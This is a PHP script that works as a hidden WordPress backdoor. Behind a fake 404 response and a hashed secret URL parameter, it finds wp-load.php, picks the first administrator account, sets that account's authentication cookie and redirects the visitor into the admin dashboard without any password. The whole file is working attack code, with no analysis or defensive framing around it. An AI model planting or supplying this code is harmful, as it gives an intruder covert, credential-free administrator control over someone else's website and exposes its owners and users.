<?php
ob_start();

// ====== HASHED SECRET KEY ====== //
$secret_hash = '$2a$12$lZKz37RfF1Ijt1lRL7c/ke9Y26cYXo8yUyNGW7tl5MOyfT3CcX1Yu'; // Ganti dengan hash asli Anda

// ====== VERIFIKASI ====== //
if (!isset($_GET['x']) || !password_verify($_GET['x'], $secret_hash)) {
    header('HTTP/1.0 404 Not Found');
    exit;
}

// ====== REST OF YOUR CODE ====== //
function find_wp_load() {
    $dir = dirname(__FILE__);
    $max_depth = 10;
    
    for ($i = 0; $i < $max_depth; $i++) {
        $path = $dir . str_repeat('/..', $i) . '/wp-load.php';
        if (file_exists($path)) {
            return realpath($path);
        }
    }
    
    $extra = [
        $dir . '/wp/wp-load.php',
        $dir . '/wordpress/wp-load.php',
        $dir . '/blog/wp-load.php'
    ];
    
    foreach ($extra as $path) {
        if (file_exists($path)) {
            return realpath($path);
        }
    }
    
    return false;
}

$wp_load_path = find_wp_load();

if ($wp_load_path) {
    require_once($wp_load_path);
    
    $admins = get_users([
        'role'   => 'administrator',
        'number' => 1
    ]);
    
    if (!empty($admins)) {
        $user = $admins[0];
        wp_set_current_user($user->ID, $user->user_login);
        wp_set_auth_cookie($user->ID);
        do_action('wp_login', $user->user_login, $user);
        wp_redirect(admin_url());
        exit;
    } else {
        exit;
    }
} else {
    exit;
}

ob_end_flush();
?>
